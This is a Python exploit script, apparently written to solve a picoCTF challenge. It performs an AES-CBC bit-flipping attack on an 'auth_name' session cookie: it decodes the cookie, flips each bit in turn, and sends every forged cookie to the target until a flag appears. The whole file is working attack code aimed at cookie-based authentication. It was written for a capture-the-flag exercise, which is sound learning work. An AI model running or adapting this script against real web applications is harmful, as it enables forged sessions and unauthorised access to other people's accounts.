#!/usr/bin/python3

import requests
from base64 import *
import sys
from time import sleep
from colorama import Fore, Style
import argparse

def Cookie(Target) :

	# Create a session object :
	session = requests.Session()

	# Make a GET request :
	session.get(Target)

	# Storing the auth_name cookie in our Cookie variable :
	Cookie = session.cookies["auth_name"]
	return Cookie


def Decoding(Encoded_Cookie) :

	# Base64 decode twice :	
	Raw_Cookie = b64decode(b64decode(Encoded_Cookie))
	
	return Raw_Cookie


def Bit_Flipping(Raw_Cookie) :

	i = 1
	Target = args.url
	# Iterate over every single byte in the Raw_Cookie :
	for byte_index in range(len(Raw_Cookie)) :
		
		sleep(1)
		print("\n" + Fore.BLUE + "[+] BYTE " + str(i) + "\n")
		sleep(1)
		i += 1
		j = 1
		# Iterate over every single bit in the current byte at the position "byte_index" => 1-Byte = 8-bits :
		for bit_index in range(0,8) :
				
			Potential_Raw_Cookie = Raw_Cookie[0:byte_index] + (Raw_Cookie[byte_index] ^ (1 << bit_index)).to_bytes(1, 'big') + Raw_Cookie[byte_index+1 :]
			print(Fore.GREEN + "	[*] FLIPPING BIT  " + str(j) + " OF BYTE " + str(i-1) + " AND SENDING ...")
			j += 1
				
			# Base64 encode twice the Potential_Raw_Cookie to send out the Potential_Cookie in the same encoding scheme:
			Potential_Cookie = b64encode(b64encode(Potential_Raw_Cookie)).decode()
					
			# Sending a GET request with the Potential_Cookie :
			r = requests.get(Target, cookies={"auth_name": Potential_Cookie})
						
			# Cheking if the response contains our flag format "picoCTF{" : 
			if ('picoCTF{' in r.text) :
					
				# After executing the script in the first time, i noticed that the flag is between <code> and </code> elements
				print(Fore.YELLOW + "		[+] SUCCESS !!! FLAG FOUND")
				print(Fore.BLUE + "		[*] HERE IS YOUR FLAG: " + Fore.WHITE + r.text.split("<code>")[1].split("</code>")[0])
				return
						
			else :
				print(Fore.RED + "		[-] FAILED !!! FLAG NOT FOUND")


if __name__ == "__main__" :
	
	try: 
		parser = argparse.ArgumentParser(description="Usage Example : python3 Bit_Flipping.py -u http://mercury.picoctf.net:34962/")
		parser.add_argument("-u", "--url", help="Enter the target URL", required=True)
		args = parser.parse_args()
		
		sleep(1)
		print ("\n" + Style.BRIGHT + Fore.BLUE + "[+] Creating a Session Object ...")
		Encoded_Cookie = Cookie(args.url)
		sleep(1)
		print (Fore.BLUE + "[+] Making a GET request ...")
		sleep(1)
		print (Fore.BLUE + "[+] Storing auth_name cookie ...")
		sleep(1)
		print ("\n" + Fore.GREEN + "	[INF] Here is the Encoded Cookie: " + Fore.YELLOW + Encoded_Cookie)
		sleep(1)
		Raw_Cookie = Decoding(Encoded_Cookie)
		print("\n" + Fore.BLUE + "[+] Double Base64 decode the Cookie ...")
		sleep(1)
		print("\n" + Fore.GREEN + "	[INF] Here is the Cookie in its raw fomat: " + Fore.YELLOW + str(Raw_Cookie))
		sleep(1)
		print("\n")
		print(Fore.RED + "[+] Starting AES-CBC Bit-Flipping Attack ...")
		Bit_Flipping(Raw_Cookie)
		sleep(1)
		
	except KeyboardInterrupt:
		print(Fore.RED + "\n	[-] The Exploit has been INTERRUPTED")

	except Exception as e:
		print(Fore.RED + "[-] " + str(e))


		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		

		

